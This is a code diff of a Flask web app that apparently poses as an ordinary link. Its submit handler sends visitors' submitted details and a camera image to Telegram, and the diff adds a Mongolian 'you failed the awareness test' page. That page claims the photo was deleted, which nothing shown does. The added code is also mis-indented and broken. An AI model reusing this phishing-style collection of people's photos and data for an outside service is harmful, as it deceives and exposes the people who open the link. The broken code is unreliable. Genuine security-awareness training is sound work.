@@ -109,8 +109,21 @@ def submit():
     )
     
     # Telegram руу илгээх (Зураг алдаатай байсан ч текстийг заавал илгээнэ)
-    send_telegram_media_notification(message, image_filepath=image_filepath)
-
+        send_telegram_media_notification(message, image_filepath=image_filepath)
+    @app.route('/success')
+    def success():
+    return """
+    <div style='text-align: center; padding: 40px; font-family: sans-serif; background-color: #fff4f4;'>
+        <h1 style='color: #d9534f;'>⚠️ ТА СОНОР СЭРЭМЖИЙН ТЕСТЭД УНАЛАА!</h1>
+        <p style='font-size: 18px;'>Та дөнгөж сая танихгүй линк дээр дарж, өөрийн мэдээллийг илгээлээ.</p>
+        <div style='background: white; display: inline-block; padding: 20px; border-radius: 10px; text-align: left; border: 1px solid #ddd;'>
+            <b>Аюулгүй байдлын зөвлөгөө:</b><br>
+            1. Линк дээр дарахаас өмнө хаягийг нь шалга (onrender.com гэх мэт).<br>
+            2. Камерын зөвшөөрөл нэхэж байвал сэжиглэ.<br>
+        </div>
+        <p style='margin-top: 20px; color: #666;'>Энэ бол зөвхөн сургалтын зориулалттай туршилт байлаа. Таны зургийг устгасан болно.</p>
+    </div>
+    """
     return redirect(url_for('success'))
     
 if __name__ == '__main__':
